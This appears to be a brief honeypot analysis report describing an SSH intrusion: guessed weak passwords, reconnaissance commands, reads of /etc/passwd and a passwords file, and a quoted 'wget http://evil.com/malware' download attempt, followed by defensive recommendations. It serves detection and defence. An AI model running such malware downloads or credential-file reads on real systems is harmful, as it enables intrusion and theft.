# Honeypot Analysis

## Summary of Observed Attacks

The SSH honeypot captured unauthorized access attempts from 172.20.0.1. The attacker logged in as admin (password: 1) and root (password: 1). Both were accepted by the honeypot to observe post-authentication behavior.
Once inside, the attacker:

Ran whoami and ls for reconnaissance
Read /etc/passwd to enumerate system users
Read /home/admin/documents/passwords.txt to harvest credentials
Attempted to download malware via wget http://evil.com/malware

## Notable Patterns

Credential guessing: Simple passwords tried against common usernames
Reconnaissance: Attacker checked identity and file listings before targeting sensitive files
Credential harvesting: Went directly for password files, indicating familiarity with Linux
Malware staging: Attempted external download, suggesting intent to establish persistence

## Recommendations

Deploy honeypots on production networks to detect lateral movement early
Feed honeypot logs into a SIEM for real-time alerting
Use fail2ban to auto-block IPs after repeated failed authentication
Monitor for reconnaissance patterns (whoami, cat /etc/passwd) as indicators of compromise